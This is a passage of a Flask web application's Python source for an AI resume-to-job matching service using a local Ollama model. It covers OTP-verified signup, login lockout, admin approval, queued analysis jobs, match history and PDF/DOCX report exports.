      - "Key Points" / "Need to Change" / "Conclusion" / "Keyword Match" /
        "ATS Friendliness" become "-> " arrow headings, each followed by
        whatever content the model/checker produced underneath.
    """
    markdown_text = strip_code_fence(markdown_text)
    html = md.markdown(markdown_text, extensions=["extra"])
    soup = BeautifulSoup(html, "html.parser")

    for heading in soup.find_all(["h1", "h2", "h3"]):
        key = heading.get_text(strip=True).lower()

        if key == SCORE_HEADING:
            heading["class"] = heading.get("class", []) + ["match-analysis-label"]

            # Collect every sibling up to the next heading, pull the first
            # NN% value out of it (robust to however the model formatted
            # this line - a bold line, a bullet, extra commentary, etc.),
            # then keep whatever text remains as the explanation paragraph
            # underneath the score.
            siblings = []
            sibling = heading.find_next_sibling()
            while sibling is not None and sibling.name not in ("h1", "h2", "h3"):
                siblings.append(sibling)
                sibling = sibling.find_next_sibling()

            combined_text = " ".join(s.get_text(" ", strip=True) for s in siblings)
            score_match = re.search(r"\d{1,3}\s*%", combined_text)
            if score_match:
                score_text = score_match.group(0).replace(" ", "")
                explanation_text = (
                    combined_text[:score_match.start()] + combined_text[score_match.end():]
                ).strip(" -:.")
            else:
                # Fall back to any standalone 1-3 digit number (handles
                # cases where the model separated the number from the "%",
                # e.g. echoing a literal "NN%" placeholder elsewhere in
                # the same line).
                number_match = re.search(r"(?<!\w)\d{1,3}(?!\w)", combined_text)
                if number_match:
                    score_text = f"{number_match.group(0)}%"
                    explanation_text = (
                        combined_text[:number_match.start()] + combined_text[number_match.end():]
                    ).strip(" -:.")
                else:
                    score_text = "N/A"
                    explanation_text = combined_text.strip()

            value_tag = soup.new_tag("p")
            value_tag["class"] = ["match-analysis-value"]
            value_tag.string = score_text

            if siblings:
                siblings[0].insert_before(value_tag)
                if explanation_text:
                    explanation_tag = soup.new_tag("p")
                    explanation_tag["class"] = ["match-analysis-explanation"]
                    explanation_tag.string = explanation_text
                    siblings[0].insert_before(explanation_tag)
                for s in siblings:
                    s.decompose()
            else:
                heading.insert_after(value_tag)

        elif key in ARROW_HEADINGS:
            heading.insert(0, "\u2192 ")  # "→ "
            heading["class"] = heading.get("class", []) + ["arrow-heading"]

    return _sanitize_html(str(soup))


OTP_MINUTES = 10            # how long a code works
OTP_MAX_WRONG = 5           # wrong codes allowed before a new code is needed
OTP_RESEND_SECONDS = 60     # minimum gap between two codes for the same email
OTP_MAX_SENDS = 5           # codes per email per hour
OTP_WINDOW_SECONDS = 3600
VERIFIED_VALID_SECONDS = 1800   # after verifying, the user has 30 minutes to finish the form
IP_MAX_SENDS_PER_HOUR = 20      # codes one visitor (IP address) can request per hour

_ip_hits: dict[str, list[float]] = {}


def signup_otp_enabled() -> bool:
    """Set SIGNUP_OTP=false in .env to skip the emailed code (not recommended)."""
    return os.environ.get("SIGNUP_OTP", "true").strip().lower() != "false"


def _ip_allowed() -> bool:
    """Stops one visitor from using 'Send OTP' to flood many inboxes."""
    now = time.time()
    ip = request.remote_addr or "?"
    hits = [t for t in _ip_hits.get(ip, []) if now - t < 3600]
    if len(hits) >= IP_MAX_SENDS_PER_HOUR:
        _ip_hits[ip] = hits
        return False
    hits.append(now)
    _ip_hits[ip] = hits
    return True


def _valid_email(email: str) -> bool:
    return bool(email) and "@" in email and "." in email.split("@")[-1] and " " not in email


def _email_is_verified(email_key: str) -> bool:
    """True if THIS browser verified this exact email recently."""
    return (
        bool(email_key)
        and session.get("verified_email") == email_key
        and time.time() - session.get("verified_at", 0) <= VERIFIED_VALID_SECONDS
    )


@app.route("/signup/send-otp", methods=["POST"])
def signup_send_otp():
    """Step 1 (on the signup form): email a 6-digit code to the typed address."""
    if not signup_otp_enabled():
        return jsonify(ok=False, error="Email verification is turned off."), 400
    data = request.get_json(silent=True) or {}
    email = str(data.get("email", "")).strip().lower()
    name = str(data.get("name", "")).strip()[:80]
    if not _valid_email(email):
        return jsonify(ok=False, error="Please enter a valid email address first."), 400
    if get_user_by_email(email):
        return jsonify(ok=False, error="An account with this email already exists. Try logging in instead."), 400

    now = time.time()
    existing = get_email_otp(email)
    if existing and now - existing["created_at"] >= OTP_WINDOW_SECONDS:
        existing = None  # old record: start counting again
    if existing:
        wait = OTP_RESEND_SECONDS - (now - existing["last_sent_at"])
        if wait > 0:
            return jsonify(ok=False, error=f"A code was just sent. Please wait {int(wait) + 1} seconds before asking for another one.",
                           resend_in=int(wait) + 1), 429
        if existing["sends"] >= OTP_MAX_SENDS:
            return jsonify(ok=False, error="Too many codes were requested for this email. Please try again in an hour."), 429
    if not _ip_allowed():
        return jsonify(ok=False, error="Too many code requests from this device. Please try again later."), 429

    code = f"{secrets.randbelow(10 ** 6):06d}"
    sent, error = mailer.send_otp_email(email, name, code, OTP_MINUTES)
    if not sent:
        return jsonify(ok=False, error=error), 503
    save_email_otp(
        email, generate_password_hash(code), expires_at=now + OTP_MINUTES * 60, now=now,
        sends=(existing["sends"] + 1) if existing else 1,
        created_at=existing["created_at"] if existing else now,
    )
    return jsonify(ok=True, message=f"We emailed a 6-digit code to {email}. It is valid for {OTP_MINUTES} minutes.",
                   resend_in=OTP_RESEND_SECONDS)


@app.route("/signup/verify-otp", methods=["POST"])
def signup_verify_otp():
    """Step 2 (on the signup form): check the code. Marks this browser as having verified the email."""
    data = request.get_json(silent=True) or {}
    email = str(data.get("email", "")).strip().lower()
    code = "".join(ch for ch in str(data.get("code", "")) if ch.isdigit())

    pending = get_email_otp(email)
    if pending is None:
        return jsonify(ok=False, error="Click \"Send OTP\" first to get a code for this email."), 400
    if time.time() > pending["expires_at"]:
        return jsonify(ok=False, error="This code has expired. Click \"Resend OTP\" to get a new one."), 400
    if pending["wrong_tries"] >= OTP_MAX_WRONG:
        return jsonify(ok=False, error="Too many wrong codes. Click \"Resend OTP\" to get a new one."), 400
    if len(code) != 6 or not check_password_hash(pending["code_hash"], code):
        tries = bump_email_otp_wrong(email)
        if tries >= OTP_MAX_WRONG:
            return jsonify(ok=False, error="Too many wrong codes. Click \"Resend OTP\" to get a new one."), 400
        left = OTP_MAX_WRONG - tries
        return jsonify(ok=False, error=f"That code is not correct. {left} attempt{'s' if left != 1 else ''} left."), 400

    delete_email_otp(email)  # a code works once
    session["verified_email"] = email
    session["verified_at"] = time.time()
    return jsonify(ok=True, message="Email verified.")


@app.route("/signup", methods=["GET", "POST"])
def signup():
    if session.get("user_id"):
        return redirect(url_for("admin_dashboard") if session.get("account_type") == "admin" else url_for("index"))

    if request.method == "POST":
        name = request.form.get("name", "").strip()
        age_raw = request.form.get("age", "").strip()
        email = request.form.get("email", "").strip()
        password = request.form.get("password", "")
        account_type = request.form.get("account_type", "user").strip()
        if account_type not in ("user", "admin"):
            account_type = "user"
        email_key = email.lower()

        error = None
        if not name or not age_raw or not email or not password:
            error = "Please fill in every field."
        elif not age_raw.isdigit() or not (0 < int(age_raw) < 130):
            error = "Please enter a valid age."
        elif "@" not in email or "." not in email.split("@")[-1]:
            error = "Please enter a valid email address."
        elif signup_otp_enabled() and not _email_is_verified(email_key):
            # The account is NEVER created before the emailed code was verified.
            error = "Please verify your email with the OTP before signing up."
        elif len(password) < 6:
            error = "Password must be at least 6 characters."

        approved = True
        if not error:
            created, approved = create_user(name, int(age_raw), email, password, account_type)
            if not created:
                error = "An account with this email already exists. Try logging in instead."

        if error:
            return render_template(
                "signup.html", error=error, name=name, age=age_raw, email=email, account_type=account_type,
                otp_required=signup_otp_enabled(), email_verified=_email_is_verified(email_key),
            )

        session.pop("verified_email", None)
        session.pop("verified_at", None)
        return _finish_signup(get_user_by_email(email), account_type, approved)

    return render_template("signup.html", otp_required=signup_otp_enabled(), email_verified=False)


def _finish_signup(new_user, account_type: str, approved: bool):
    """Emails + flash + redirect after the account was created."""
    needs_approval = account_type == "admin" and not approved
    if new_user:
        if needs_approval:
            # Tell the applicant who has to approve, and tell those admins a request is waiting.
            approvers = [u for u in get_all_users() if u["account_type"] == "admin" and u["is_approved"]]
            mailer.send_signup_email(new_user, pending_approval=True, approvers=approvers)
            mailer.send_admin_request_notice(approvers, new_user)
        else:
            mailer.send_signup_email(new_user)
    if needs_approval:
        flash("Account created. An existing admin must approve it before you can log in.", "success")
    else:
        flash("Account created successfully. Please log in.", "success")
    return redirect(url_for("login"))


LOCKED_MESSAGE = (
    "This account is locked after 3 wrong password attempts. "
    "Please contact an admin to unlock it."
)


@app.route("/login", methods=["GET", "POST"])
def login():
    if session.get("user_id"):
        return redirect(url_for("admin_dashboard") if session.get("account_type") == "admin" else url_for("index"))

    if request.method == "POST":
        email = request.form.get("email", "").strip()
        password = request.form.get("password", "")

        user = get_user_by_email(email)
        if user is not None and user["is_locked"]:
            # Locked accounts stay locked even with the right password.
            return render_template("login.html", error=LOCKED_MESSAGE, email=email)
        if user is None or not check_password_hash(user["password_hash"], password):
            if user is None:
                return render_template("login.html", error="Incorrect email or password.", email=email)
            attempts, just_locked = register_failed_login(user["user_id"])
            if just_locked:
                mailer.send_account_locked_email(get_user_by_id(user["user_id"]))
                return render_template("login.html", error=LOCKED_MESSAGE, email=email)
            left = max(MAX_FAILED_ATTEMPTS - attempts, 0)
            return render_template(
                "login.html", email=email,
                error=f"Incorrect email or password. {left} attempt{'s' if left != 1 else ''} left "
                      "before this account is locked.",
            )

        if user["account_type"] == "admin" and not user["is_approved"]:
            return render_template(
                "login.html",
                error="Your admin account is awaiting approval from an existing admin.",
                email=email,
            )

        reset_failed_attempts(user["user_id"])
        session.clear()
        session["user_id"] = user["user_id"]
        session["user_name"] = user["name"]
        session["account_type"] = user["account_type"]
        record_login(user["user_id"])
        # Remember how many analyses existed when this login started, so the
        # logout email can tell what was done during THIS login only.
        session["match_count_at_login"] = user["match_count"] or 0
        mailer.send_login_email(get_user_by_id(user["user_id"]))

        # Auto-detect account type and send each user straight to their
        # own dashboard - admins to the admin dashboard, everyone else to
        # the resume matcher.
        if user["account_type"] == "admin":
            return redirect(url_for("admin_dashboard"))
        return redirect(url_for("index"))

    return render_template("login.html")


def _match_report_pdf_bytes(user) -> bytes | None:
    """The user's latest match report as PDF bytes (same report they can
    download), or None if they haven't run a match yet. Used only for the
    logout email; never raises, so it can't block logging out."""
    try:
        if not user["latest_match_markdown"]:
            return None
        body_html = format_report_html(user["latest_match_markdown"])
        full_html = render_template("pdf_report.html", body=body_html, css=_read_pdf_css())
        buffer = io.BytesIO()
        from xhtml2pdf import pisa  # loaded only when a PDF is generated
        result = pisa.CreatePDF(src=full_html, dest=buffer)
        return None if result.err else buffer.getvalue()
    except Exception as exc:  # noqa: BLE001
        print(f"[mailer] Could not build the PDF for the logout email: {exc}")
        return None


@app.route("/logout", methods=["POST"])
def logout():
    user_id = session.get("user_id")
    if user_id:
        before = get_user_by_id(user_id)
        first_logout_ever = before is not None and before["last_logout_time"] is None
        record_logout(user_id)
        try:
            fresh_user = get_user_by_id(user_id)
            if fresh_user:
                baseline = session.get("match_count_at_login")
                done_now = 0 if baseline is None else max((fresh_user["match_count"] or 0) - baseline, 0)
                if done_now > 0:
                    # An analysis was run in this login: email it with its PDF.
                    mailer.send_logout_email(fresh_user, _match_report_pdf_bytes(fresh_user), done_now)
                else:
                    # Nothing was analysed: never re-send an older analysis.
                    mode = mailer.no_analysis_mode()
                    if mode == "always" or (mode == "first_time" and first_logout_ever):
                        mailer.send_no_analysis_email(fresh_user)
        except Exception as exc:  # noqa: BLE001 - email must never block logout
            print(f"[mailer] Logout email skipped: {exc}")
    session.clear()
    flash("You've been logged out.", "success")
    return redirect(url_for("login"))


@app.route("/admin")
@admin_required
def admin_dashboard():
    users = get_all_users()
    pending_admins = [u for u in users if u["account_type"] == "admin" and not u["is_approved"]]
    locked_users = [u for u in users if u["is_locked"]]
    return render_template(
        "admin_dashboard.html",
        user_name=session.get("user_name"),
        users=users,
        pending_admins=pending_admins,
        locked_users=locked_users,
    )


@app.route("/admin/unlock/<int:user_id>", methods=["POST"])
@admin_required
def admin_unlock(user_id):
    target = get_user_by_id(user_id)
    if target is None or not target["is_locked"]:
        flash("That account is not locked.", "error")
    else:
        unlock_user(user_id)
        mailer.send_account_unlocked_email(get_user_by_id(user_id))
        flash(f"Unlocked {target['email']}. They can log in again (an email was sent).", "success")
    return redirect(url_for("admin_dashboard"))


@app.route("/admin/approve/<int:user_id>", methods=["POST"])
@admin_required
def admin_approve(user_id):
    approve_user(user_id)
    approved_user = get_user_by_id(user_id)
    if approved_user and approved_user["account_type"] == "admin":
        mailer.send_admin_approved_email(approved_user)
    flash("Admin account approved.", "success")
    return redirect(url_for("admin_dashboard"))


@app.route("/admin/resume/<int:user_id>")
@admin_required
def admin_download_resume(user_id):
    user = get_user_by_id(user_id)
    if not user or not user["latest_resume_blob"]:
        return redirect(url_for("admin_dashboard"))
    return send_file(
        io.BytesIO(user["latest_resume_blob"]),
        mimetype=user["latest_resume_mimetype"] or "application/octet-stream",
        as_attachment=True,
        download_name=user["latest_resume_filename"] or "resume",
    )


@app.route("/admin/job/<int:user_id>")
@admin_required
def admin_download_job(user_id):
    user = get_user_by_id(user_id)
    if not user or not user["latest_job_blob"]:
        return redirect(url_for("admin_dashboard"))
    return send_file(
        io.BytesIO(user["latest_job_blob"]),
        mimetype=user["latest_job_mimetype"] or "application/octet-stream",
        as_attachment=True,
        download_name=user["latest_job_filename"] or "job_description",
    )


@app.route("/dashboard")
@login_required
def dashboard():
    user = get_user_by_id(session["user_id"])
    return render_template("dashboard.html", user=user)


@app.route("/report/pdf-previous")
@login_required
def report_pdf_previous():
    user = get_user_by_id(session["user_id"])
    if not user["latest_match_markdown"]:
        flash("You haven't generated a match report yet.", "error")
        return redirect(url_for("dashboard"))

    body_html = format_report_html(user["latest_match_markdown"])
    full_html = render_template("pdf_report.html", body=body_html, css=_read_pdf_css())

    pdf_buffer = io.BytesIO()
    from xhtml2pdf import pisa  # loaded only when a PDF is generated
    result = pisa.CreatePDF(src=full_html, dest=pdf_buffer)
    if result.err:
        flash("Could not generate the PDF report.", "error")
        return redirect(url_for("dashboard"))

    record_pdf_generated(user["user_id"])
    pdf_buffer.seek(0)
    return send_file(
        pdf_buffer,
        mimetype="application/pdf",
        as_attachment=True,
        download_name="resume_match_report.pdf",
    )


@app.route("/")
@login_required
def index():
    return render_template("index.html", model_name=MODEL_NAME, user_name=session.get("user_name"))


def build_match_prompt(resume_text: str, job_text: str) -> str:
    return f"""
    You are an AI career assistant. Compare the resume against the job description
    and reply in clean Markdown using EXACTLY this structure (no extra sections,
    no text before or after it, no other headings):

    ## Match Analysis
    On the first line, write only a single bold percentage, for example **85%**.
    Then, below it, write a detailed 5-7 sentence explanation of why the
    candidate received that score. Reference specific skills, tools, or
    experience from the resume that line up with the job description, and
    specific gaps or mismatches that pulled the score down. Be concrete and
    specific rather than generic - avoid vague filler like "the candidate
    seems like a good fit."

    ## Key Points
    A bullet list ("- ") of the resume strengths that align with the job.
    Use as many bullet points as are genuinely relevant - do not pad and do
    not invent a fixed count. Keep each bullet to one short sentence.

    ## Need to Change
    A bullet list ("- ") of specific, actionable changes the candidate should
    make to better fit the job. Use as many bullet points as are genuinely
    relevant. Keep each bullet to one short sentence.

    ## Conclusion
    A short 2-4 sentence summary of the overall fit and the single most
    important next step. You may add a bullet point or two here as well if
    it helps make the conclusion clearer.

    Resume:
    {resume_text}

    Job Description:
    {job_text}
    """


# ---------------------------------------------------------------------------
# Background jobs with a progress indicator
# ---------------------------------------------------------------------------
# The analysis takes a while on a local model, so /match starts a job and returns at once; the page
# polls /jobs/<id> to show which step is running. Only one AI task runs at a time (the local model
# handles one request at a time), so extra jobs wait in a queue and the page shows their position.
JOBS: dict[str, dict] = {}
JOBS_LOCK = threading.Lock()
AI_LOCK = threading.Lock()
JOB_TTL_SECONDS = 3600
MATCH_STAGES = ["Reading your files", "Checking ATS format", "AI is comparing resume and job",
                "Finding matched and missing skills", "Saving your results"]
IMPROVE_STAGES = ["Reading your saved resume", "Matching skills with the job", "Writing summary and bullet points (AI)",
                  "Scoring the new resume (ATS)", "Preparing your downloads"]
STAGE_PERCENT = {"match": [4, 16, 28, 78, 94], "improve": [5, 18, 40, 82, 94]}
ALLOWED_UPLOADS = (".pdf", ".docx", ".txt", ".png", ".jpg", ".jpeg")
IMAGE_UPLOADS = (".png", ".jpg", ".jpeg")


class UserFacingError(Exception):
    """An error whose message is safe and useful to show to the user as is."""


def _friendly_error(exc: Exception) -> str:
    if isinstance(exc, (UserFacingError, ocr.OCRUnavailable)):
        return str(exc)
    if isinstance(exc, requests.exceptions.ConnectionError):
        return ("Could not connect to Ollama at http://localhost:11434. Make sure Ollama is running "
                "(open a terminal and run `ollama serve`, or launch the Ollama app), then try again.")
    if isinstance(exc, requests.exceptions.HTTPError):
        return (f"Ollama returned an error. This usually means the model '{MODEL_NAME}' isn't downloaded yet. "
                f"Run this in a terminal: ollama pull {MODEL_NAME}")
    if isinstance(exc, requests.exceptions.Timeout):
        return "The request took too long and timed out. Try again, or close other running apps to free up memory."
    return f"An error occurred: {exc}"


def _job_cleanup() -> None:
    cutoff = time.time() - JOB_TTL_SECONDS
    with JOBS_LOCK:
        for job_id in [j for j, v in JOBS.items() if v["created"] < cutoff]:
            del JOBS[job_id]


def _job_create(user_id: int, kind: str, stages: list[str]) -> str:
    _job_cleanup()
    job_id = secrets.token_urlsafe(16)
    with JOBS_LOCK:
        JOBS[job_id] = {"user_id": user_id, "kind": kind, "stages": stages, "stage": 0, "percent": 0,
                        "message": "Waiting to start...", "status": "queued", "created": time.time(),
                        "result": None, "error": None}
    return job_id


def _job_set(job_id: str, **fields) -> None:
    with JOBS_LOCK:
        if job_id in JOBS:
            JOBS[job_id].update(fields)


def _job_stage(job_id: str, index: int, message: str | None = None) -> None:
    with JOBS_LOCK:
        job = JOBS.get(job_id)
        if job:
            job.update(stage=index, percent=STAGE_PERCENT[job["kind"]][index], status="running",
                       message=message or job["stages"][index])


def _active_job_for(user_id: int) -> bool:
    with JOBS_LOCK:
        return any(j["user_id"] == user_id and j["status"] in ("queued", "running") for j in JOBS.values())


def _start_job(job_id: str, target, *args) -> None:
    def run():
        _job_set(job_id, message="Waiting for another analysis to finish...")
        with AI_LOCK:
            try:
                result = target(job_id, *args)
                _job_set(job_id, status="done", percent=100, message="Done", result=result)
            except Exception as exc:  # noqa: BLE001 - shown to the user as a friendly message
                if not isinstance(exc, (UserFacingError, ocr.OCRUnavailable, requests.exceptions.RequestException)):
                    app.logger.exception("Background job failed")
                _job_set(job_id, status="error", error=_friendly_error(exc))

    threading.Thread(target=run, daemon=True).start()


def _queue_position(job_id: str) -> int | None:
    with JOBS_LOCK:
        me = JOBS.get(job_id)
        if not me or me["status"] != "queued":
            return None
        waiting_before = sum(1 for j in JOBS.values() if j is not me and j["created"] < me["created"]
                             and j["status"] == "queued")
        return waiting_before + 1       # 1 = next in line (the running job is not counted)


def _llm(prompt: str, num_predict: int, temperature: float) -> str:
    return _call_ollama(prompt, num_predict, temperature)


def _match_job(job_id, user_id, resume_filename, resume_mimetype, resume_bytes, job_filename, job_mimetype, job_bytes):
    is_image = (resume_filename or "").lower().endswith(IMAGE_UPLOADS) or (job_filename or "").lower().endswith(IMAGE_UPLOADS)
    _job_stage(job_id, 0, "Reading your files (image text recognition can take a few seconds)..." if is_image else None)
    try:
        resume_text, resume_meta = get_document_data(resume_filename, resume_bytes)
        job_text, _ = get_document_data(job_filename, job_bytes)
    except (ocr.OCRUnavailable, UserFacingError):
        raise
    except Exception as exc:  # noqa: BLE001
        raise UserFacingError(f"Could not read one of the files: {exc}") from exc

    # ATS Friendliness is judged on the resume's full original text/layout, before any truncation.
    full_resume_text, full_job_text = resume_text, job_text
    if len(resume_text) > MAX_CHARS_PER_DOCUMENT:
        resume_text = resume_text[:MAX_CHARS_PER_DOCUMENT] + "\n...(truncated)"
    if len(job_text) > MAX_CHARS_PER_DOCUMENT:
        job_text = job_text[:MAX_CHARS_PER_DOCUMENT] + "\n...(truncated)"

    _job_stage(job_id, 1)
    ats_section = build_ats_check_html(
        full_resume_text, has_tables=resume_meta.get("has_tables", False), is_scanned=resume_meta.get("is_scanned", False))

    _job_stage(job_id, 2)
    output_markdown = _call_ollama(build_match_prompt(resume_text, job_text), num_predict=900, temperature=0.2)
    output_markdown = strip_code_fence(output_markdown or "No response from model.")

    _job_stage(job_id, 3)
    keywords = analyze_keywords(resume_text, job_text)
    keyword_section = render_keyword_html(keywords) if keywords else ""

    _job_stage(job_id, 4)
    key_points_heading = r"^##\s*Key Points"
    output_markdown = insert_section_before_heading(output_markdown, key_points_heading, ats_section)
    output_markdown = insert_section_before_heading(output_markdown, key_points_heading, keyword_section)
    output_html = format_report_html(output_markdown)

    record_match_result(
        user_id=user_id, resume_filename=resume_filename, resume_mimetype=resume_mimetype, resume_bytes=resume_bytes,
        resume_text=full_resume_text, job_filename=job_filename, job_mimetype=job_mimetype, job_bytes=job_bytes,
        job_text=full_job_text, match_markdown=output_markdown,
    )
    history_id = add_match_history(user_id, resume_filename, job_filename, output_markdown, full_resume_text,
                                   full_job_text, resume_meta, keywords)
    return {"result_html": output_html, "result_markdown": output_markdown, "history_id": history_id}


def _improve_job(job_id, user_id, history_id, confirmed):
    _job_stage(job_id, 0)
    entry = get_match_history_entry(history_id, user_id)
    if entry is None:
        raise UserFacingError("That analysis was not found.")
    keywords = json.loads(entry["keywords_json"]) if entry["keywords_json"] else None
    meta = json.loads(entry["resume_meta"]) if entry["resume_meta"] else {}
    improved = resume_builder.build_improved_resume(
        entry["resume_text"] or "", entry["job_text"] or "", keywords, confirmed, llm=_llm, meta=meta,
        progress=lambda i: _job_stage(job_id, i),
    )
    _job_stage(job_id, 4)
    save_improved_resume(history_id, user_id, improved)
    return {"improved": improved, "preview_html": resume_builder.to_html(improved)}


@app.errorhandler(413)
def _too_large(_error):
    return jsonify({"error": "The upload is too large (max 25 MB in total)."}), 413


@app.route("/match", methods=["POST"])
@api_login_required
def match():
    resume_file = request.files.get("resume")
    job_file = request.files.get("job")
    if not resume_file or not job_file or resume_file.filename == "" or job_file.filename == "":
        return jsonify({"error": "Please upload both a Resume and a Job Description."}), 400
    for upload in (resume_file, job_file):
        if not (upload.filename or "").lower().endswith(ALLOWED_UPLOADS):
            return jsonify({"error": "Unsupported file type. Please upload PDF, DOCX, TXT, PNG, JPG or JPEG files."}), 400
    if _active_job_for(session["user_id"]):
        return jsonify({"error": "You already have an analysis running. Please wait for it to finish."}), 409

    job_id = _job_create(session["user_id"], "match", MATCH_STAGES)
    _start_job(job_id, _match_job, session["user_id"],
               resume_file.filename, resume_file.mimetype, resume_file.read(),
               job_file.filename, job_file.mimetype, job_file.read())
    return jsonify({"job_id": job_id, "stages": MATCH_STAGES}), 202


@app.route("/jobs/<job_id>")
@api_login_required
def job_status(job_id):
    with JOBS_LOCK:
        job = JOBS.get(job_id)
        snapshot = dict(job) if job and job["user_id"] == session["user_id"] else None
    if snapshot is None:
        return jsonify({"error": "That task was not found (it may have expired). Please start again."}), 404
    payload = {"status": snapshot["status"], "stage": snapshot["stage"], "stages": snapshot["stages"],
               "percent": snapshot["percent"], "message": snapshot["message"],
               "queue_position": _queue_position(job_id),
               "next_percent": (STAGE_PERCENT[snapshot["kind"]] + [98])[min(snapshot["stage"] + 1, len(STAGE_PERCENT[snapshot["kind"]]))]}
    if snapshot["status"] == "done":
        payload["result"] = snapshot["result"]
    elif snapshot["status"] == "error":
        payload["error"] = snapshot["error"]
    return jsonify(payload)


# ---------------------------------------------------------------------------
# History + ATS resume
# ---------------------------------------------------------------------------
@app.route("/history")
@login_required
def history_page():
    return render_template("history.html", entries=list_match_history(session["user_id"]))


@app.route("/history/<int:history_id>")
@login_required
def history_detail(history_id):
    entry = get_match_history_entry(history_id, session["user_id"])
    if entry is None:
        flash("That analysis was not found.", "error")
        return redirect(url_for("history_page"))
    return render_template("history_detail.html", entry=entry,
                           analysis_html=format_report_html(entry["analysis_markdown"] or ""))


@app.route("/history/<int:history_id>/delete", methods=["POST"])
@login_required
def history_delete(history_id):
    delete_match_history_entry(history_id, session["user_id"])
    flash("Deleted from your history.", "success")
    return redirect(url_for("history_page"))


def _markdown_to_pdf_bytes(markdown_text: str) -> bytes | None:
    body_html = format_report_html(markdown_text)
    full_html = render_template("pdf_report.html", body=body_html, css=_read_pdf_css())
    pdf_buffer = io.BytesIO()
    from xhtml2pdf import pisa  # loaded only when a PDF is generated
    result = pisa.CreatePDF(src=full_html, dest=pdf_buffer)
    return None if result.err else pdf_buffer.getvalue()


@app.route("/history/<int:history_id>/report.pdf")
@login_required
def history_report_pdf(history_id):
    entry = get_match_history_entry(history_id, session["user_id"])
    if entry is None or not (entry["analysis_markdown"] or "").strip():
        flash("That report was not found.", "error")
        return redirect(url_for("history_page"))
    pdf = _markdown_to_pdf_bytes(entry["analysis_markdown"])
    if pdf is None:
        flash("Could not generate the PDF report.", "error")
        return redirect(url_for("history_detail", history_id=history_id))
    record_pdf_generated(session["user_id"])
    return send_file(io.BytesIO(pdf), mimetype="application/pdf", as_attachment=True,
                     download_name="resume_match_report.pdf")


@app.route("/history/<int:history_id>/improve-info")
@api_login_required
def history_improve_info(history_id):
    """What the ATS-resume card needs: the job's requirements missing from the resume (for the
    'I really have this' checklist) and the saved result of an earlier run, if any."""
    entry = get_match_history_entry(history_id, session["user_id"])
    if entry is None:
        return jsonify({"error": "That analysis was not found."}), 404
    keywords = json.loads(entry["keywords_json"]) if entry["keywords_json"] else None
    improved = json.loads(entry["improved_json"]) if entry["improved_json"] else None
    return jsonify({
        "missing": resume_builder.missing_items(entry["resume_text"] or "", entry["job_text"] or "", keywords),
        "improved": improved,
        "preview_html": resume_builder.to_html(improved) if improved else None,
    })


@app.route("/history/<int:history_id>/improve", methods=["POST"])
@api_login_required
def history_improve(history_id):
    entry = get_match_history_entry(history_id, session["user_id"])
    if entry is None:
        return jsonify({"error": "That analysis was not found."}), 404
    if _active_job_for(session["user_id"]):
        return jsonify({"error": "You already have a task running. Please wait for it to finish."}), 409
    keywords = json.loads(entry["keywords_json"]) if entry["keywords_json"] else None
    offered = resume_builder.missing_items(entry["resume_text"] or "", entry["job_text"] or "", keywords)
    allowed = {s["skill"].lower() for s in offered["skills"]} | {l.lower() for l in offered["languages"]}
    asked = (request.get_json(silent=True) or {}).get("confirmed") or []
    confirmed = [str(c) for c in asked[:80] if isinstance(c, str) and c.lower() in allowed]   # only what was offered
    job_id = _job_create(session["user_id"], "improve", IMPROVE_STAGES)
    _start_job(job_id, _improve_job, session["user_id"], history_id, confirmed)
    return jsonify({"job_id": job_id, "stages": IMPROVE_STAGES}), 202


@app.route("/history/<int:history_id>/resume.<fmt>")
@login_required
def history_resume_download(history_id, fmt):
    entry = get_match_history_entry(history_id, session["user_id"])
    if entry is None or not entry["improved_json"] or fmt not in ("docx", "pdf"):
        flash("Create the ATS resume first, then download it.", "error")
        return redirect(url_for("history_detail", history_id=history_id) if entry else url_for("history_page"))
    improved = json.loads(entry["improved_json"])
    who = re.sub(r"[^A-Za-z0-9_-]+", "_", (improved.get("header") or {}).get("name") or "Resume").strip("_")[:40] or "Resume"
    try:
        if fmt == "docx":
            data = resume_builder.to_docx_bytes(improved)
            mimetype = "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
        else:
            data = resume_builder.to_pdf_bytes(improved)
            mimetype = "application/pdf"
    except Exception:  # noqa: BLE001
        app.logger.exception("Resume export failed")
        flash("Could not create that file. Please try again.", "error")
        return redirect(url_for("history_detail", history_id=history_id))
    return send_file(io.BytesIO(data), mimetype=mimetype, as_attachment=True, download_name=f"ATS_Resume_{who}.{fmt}")


def _read_pdf_css() -> str:
    """Load the PDF report's stylesheet from static/pdf-report.css. Read
    fresh (not cached) so edits to the CSS file take effect without
    restarting the server - this file is small and only read once per
    PDF export, so the cost is negligible.
    """
    css_path = os.path.join(app.static_folder, "pdf-report.css")
    with open(css_path, "r", encoding="utf-8") as css_file:
        return css_file.read()


@app.route("/download-pdf", methods=["POST"])
@api_login_required
def download_pdf():
    data = request.get_json(silent=True) or {}
    markdown_text = data.get("markdown", "")

    if not markdown_text.strip():
        return jsonify({"error": "No report content to export."}), 400

    pdf = _markdown_to_pdf_bytes(markdown_text)
    if pdf is None:
        return jsonify({"error": "Could not generate the PDF report."}), 500

    record_pdf_generated(session["user_id"])
    return send_file(io.BytesIO(pdf), mimetype="application/pdf", as_attachment=True,
                     download_name="resume_match_report.pdf")


if __name__ == "__main__":
    app.run(debug=True, port=5000)
